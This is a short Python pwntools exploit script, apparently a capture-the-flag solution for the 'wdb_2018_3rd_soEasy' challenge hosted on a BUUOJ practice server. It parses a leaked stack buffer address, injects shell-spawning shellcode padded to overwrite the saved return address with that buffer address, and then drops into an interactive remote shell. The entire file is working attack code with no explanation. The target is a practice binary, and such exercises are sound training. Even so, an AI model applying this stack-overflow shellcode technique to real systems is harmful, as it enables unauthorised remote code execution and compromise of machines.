# coding:utf-8
from pwn import *

# p = process("./wdb_2018_3rd_soEasy")
p = remote("node4.buuoj.cn", 28349)

def pwn():
    buf_addr = int(p.recvuntil("\n",drop=True)[21:32],16)
    log.success('buf_addr => ' + hex(buf_addr))
    log.info("len => " + str(len(asm(shellcraft.sh()))))
    payload = asm(shellcraft.sh()).ljust(0x48, b'a') + b'bbbb' + p64(buf_addr)
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    pwn()